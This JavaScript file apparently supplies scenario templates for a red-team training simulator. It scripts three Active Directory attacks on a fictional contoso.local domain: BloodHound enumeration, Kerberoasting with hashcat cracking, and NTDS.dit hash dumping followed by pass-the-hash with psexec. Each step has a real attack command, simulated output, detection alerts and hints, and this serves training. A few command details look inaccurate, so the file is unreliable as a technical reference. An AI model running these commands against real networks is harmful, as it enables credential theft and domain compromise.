/**
 * Scenario Templates
 * 
 * Pre-built templates for common attack scenarios
 * Users can create from these templates and customize
 */

/**
 * BloodHound-style reconnaissance template
 */
export const bloodhoundTemplate = {
  id: 'bloodhound_custom_' + Date.now(),
  name: 'BloodHound Reconnaissance',
  difficulty: 'Beginner',
  machines: {
    attacker: { name: 'ATTACKER01', ip: '10.0.0.5' },
    internal: { name: 'SRV-APP01', ip: '10.0.0.10' },
    dc: { name: 'DC01', ip: '10.0.0.20' }
  },
  mission: {
    target: 'contoso.local',
    objective: 'Use BloodHound to enumerate Active Directory and identify attack paths to Domain Admin.',
    notes: 'Basic BloodHound reconnaissance for junior red teamers.'
  },
  steps: [
    {
      id: 1,
      description: 'Start the Neo4j graph database service',
      expectedCommand: 'neo4j-start',
      attackerOutput: '[*] Starting Neo4j database...\n[*] Neo4j is running at http://localhost:7474\n[*] Bolt protocol available at bolt://localhost:7687\n[+] Database ready!',
      internalOutput: '[INFO] Neo4j Graph Database - Version 4.4.0\n[INFO] Starting database service...\n[INFO] Database started successfully',
      dcOutput: '',
      hintShort: 'Start the database that backs BloodHound',
      hintFull: 'BloodHound uses Neo4j on the backend. You need to start Neo4j before running the ingestor to collect AD data.',
      scoreValue: 10
    },
    {
      id: 2,
      description: 'Run BloodHound Python collector to gather AD data',
      expectedCommand: 'bloodhound-python -d contoso.local -u admin -p Password123 --zip',
      attackerOutput: '[*] Initializing BloodHound Python collector\n[*] Connecting to contoso.local...\n[*] Authenticating as admin@contoso.local\n[+] Authentication successful!\n[*] Collecting users, groups, computers...\n[*] Compressing data to BH.zip\n[+] Collection complete!',
      internalOutput: '[LDAP] Connection established from 10.0.0.5:49152\n[AUTH] NTLM authentication attempt: CONTOSO\\admin\n[AUTH] Authentication successful\n[LDAP] Querying LDAP for domain objects...\n[WARN] Extensive enumeration activity detected',
      dcOutput: '[SECURITY] Unusual LDAP query pattern detected from 10.0.0.5\n[ALERT] Consider investigating admin account activity',
      hintShort: 'Use BloodHound Python to collect AD data',
      hintFull: 'The BloodHound Python ingestor connects to the domain controller via LDAP and collects information about users, groups, computers, and trust relationships.',
      scoreValue: 10
    },
    {
      id: 3,
      description: 'Analyze collected data to find attack paths',
      expectedCommand: 'bloodhound-import BH.zip',
      attackerOutput: '[+] BloodHound Collection Summary\n[+] Domain: contoso.local\n[+] Users: 245\n[+] Groups: 89\n[+] Computers: 156\n[+] Output File: BH.zip (2.3 MB)\n[*] Next Steps:\n[*] 1. Open BloodHound GUI\n[*] 2. Import BH.zip\n[*] 3. Run pre-built queries to find attack paths',
      internalOutput: '[INFO] Data import completed successfully',
      dcOutput: '',
      hintShort: 'Import the collected data into BloodHound GUI',
      hintFull: 'The BloodHound GUI allows you to visualize the collected data and run pre-built queries to find attack paths to Domain Admin.',
      scoreValue: 10
    }
  ]
};

/**
 * Kerberoasting attack template
 */
export const kerberoastTemplate = {
  id: 'kerberoast_custom_' + Date.now(),
  name: 'Kerberoasting Attack',
  difficulty: 'Intermediate',
  machines: {
    attacker: { name: 'ATTACKER01', ip: '10.0.0.5' },
    internal: { name: 'SRV-APP01', ip: '10.0.0.10' },
    dc: { name: 'DC01', ip: '10.0.0.20' }
  },
  mission: {
    target: 'contoso.local',
    objective: 'Identify and crack service account credentials using Kerberoasting.',
    notes: 'Intermediate-level attack targeting service accounts with SPNs.'
  },
  steps: [
    {
      id: 1,
      description: 'Enumerate Service Principal Names (SPNs) in the domain',
      expectedCommand: 'GetUserSPNs.py -request -dc-ip 10.0.0.20 contoso.local/admin:Password123',
      attackerOutput: '[*] Enumerating Service Principal Names...\n[+] Authentication successful\n[+] Found 12 kerberoastable accounts:\n  - svc_app01\n  - svc_db01\n  - svc_web01\n[+] Requesting service tickets...',
      internalOutput: '[KERBEROS] SPN enumeration request from 10.0.0.5\n[KERBEROS] Service ticket requests detected\n[WARN] Multiple TGS-REQ packets from single source',
      dcOutput: '[SECURITY] Kerberos TGS-REQ activity from 10.0.0.5\n[ALERT] Potential Kerberoasting attack detected',
      hintShort: 'Find accounts with Service Principal Names',
      hintFull: 'Use GetUserSPNs.py to enumerate all user accounts that have SPNs registered, making them targets for Kerberoasting.',
      scoreValue: 10
    },
    {
      id: 2,
      description: 'Request service tickets for cracking',
      expectedCommand: 'impacket-getTGSs -request contoso.local/admin:Password123 -spn svc_app01',
      attackerOutput: '[*] Requesting TGS for svc_app01...\n[+] TGS obtained successfully\n[+] Ticket saved to svc_app01.ccache\n[*] Ticket ready for offline cracking',
      internalOutput: '[KERBEROS] TGS-REQ for svc_app01 from 10.0.0.5\n[KERBEROS] TGS issued\n[WARN] Service ticket exported',
      dcOutput: '[SECURITY] Unusual TGS request pattern\n[ALERT] Service ticket may have been compromised',
      hintShort: 'Request TGS tickets for service accounts',
      hintFull: 'Once you have identified kerberoastable accounts, request their TGS tickets which can be cracked offline using tools like Hashcat.',
      scoreValue: 10
    },
    {
      id: 3,
      description: 'Crack the service ticket hash offline',
      expectedCommand: 'hashcat -m 13100 svc_app01.ccache rockyou.txt',
      attackerOutput: '[*] Starting offline hash cracking...\n[+] Hash cracked successfully!\n[+] Password: ServicePassword123\n[+] Credentials: svc_app01:ServicePassword123',
      internalOutput: '[INFO] No suspicious activity (offline cracking)',
      dcOutput: '',
      hintShort: 'Use a password cracking tool',
      hintFull: 'Hashcat or John the Ripper can be used to crack the TGS ticket hashes offline, potentially revealing service account passwords.',
      scoreValue: 10
    }
  ]
};

/**
 * Lateral movement template
 */
export const lateralMovementTemplate = {
  id: 'lateral_custom_' + Date.now(),
  name: 'Lateral Movement Attack',
  difficulty: 'Advanced',
  machines: {
    attacker: { name: 'ATTACKER01', ip: '10.0.0.5' },
    internal: { name: 'SRV-APP01', ip: '10.0.0.10' },
    dc: { name: 'DC01', ip: '10.0.0.20' }
  },
  mission: {
    target: 'contoso.local',
    objective: 'Move laterally through the network using compromised credentials and techniques.',
    notes: 'Advanced attack demonstrating lateral movement techniques.'
  },
  steps: [
    {
      id: 1,
      description: 'Dump NTLM hashes from compromised system',
      expectedCommand: 'secretsdump.py -ntds NTDS.dit -system SYSTEM local',
      attackerOutput: '[*] Parsing NTDS.dit file...\n[+] Dumping NTLM hashes...\n[+] Found 245 user accounts\n[+] Hashes saved to hashes.txt',
      internalOutput: '[SECURITY] NTDS.dit file access detected\n[ALERT] Possible credential dumping activity',
      dcOutput: '[SECURITY] Unauthorized NTDS.dit access attempt\n[ALERT] Credential dumping detected',
      hintShort: 'Extract credential hashes from the system',
      hintFull: 'Using tools like secretsdump.py, you can extract NTLM hashes from the NTDS.dit file on domain controllers.',
      scoreValue: 10
    },
    {
      id: 2,
      description: 'Use Pass-the-Hash to authenticate as another user',
      expectedCommand: 'psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee contoso.local/administrator@10.0.0.20',
      attackerOutput: '[*] Connecting to 10.0.0.20 using NTLM hash...\n[+] Authentication successful\n[+] Remote shell obtained\n[+] Connected as CONTOSO\\administrator',
      internalOutput: '[AUTH] NTLM authentication from 10.0.0.5\n[SECURITY] Suspicious authentication pattern\n[ALERT] Possible Pass-the-Hash attack',
      dcOutput: '[SECURITY] Unusual authentication from 10.0.0.5\n[ALERT] Potential lateral movement detected',
      hintShort: 'Authenticate using NTLM hash',
      hintFull: 'Pass-the-Hash allows you to authenticate using just the NTLM hash without knowing the plaintext password.',
      scoreValue: 10
    },
    {
      id: 3,
      description: 'Execute commands on remote system',
      expectedCommand: 'whoami',
      attackerOutput: 'CONTOSO\\administrator',
      internalOutput: '[SECURITY] Command execution detected\n[ALERT] Remote code execution confirmed',
      dcOutput: '',
      hintShort: 'Verify remote code execution',
      hintFull: 'Once authenticated, you can execute arbitrary commands on the remote system with the privileges of the compromised account.',
      scoreValue: 10
    }
  ]
};

/**
 * Get all available templates
 */
export const templates = [
  { id: 'bloodhound', name: 'BloodHound Reconnaissance', description: 'AD enumeration using BloodHound' },
  { id: 'kerberoast', name: 'Kerberoasting Attack', description: 'Service account credential extraction' },
  { id: 'lateral', name: 'Lateral Movement', description: 'Network traversal and privilege escalation' }
];

/**
 * Get a template by ID
 * @param {string} templateId - The template ID
 * @returns {Object} The template object with a new unique ID
 */
export function getTemplate(templateId) {
  let template = null;

  switch (templateId) {
    case 'bloodhound':
      template = JSON.parse(JSON.stringify(bloodhoundTemplate));
      break;
    case 'kerberoast':
      template = JSON.parse(JSON.stringify(kerberoastTemplate));
      break;
    case 'lateral':
      template = JSON.parse(JSON.stringify(lateralMovementTemplate));
      break;
    default:
      return null;
  }

  // Generate new unique ID
  if (template) {
    template.id = `${templateId}_custom_${Date.now()}`;
  }

  return template;
}
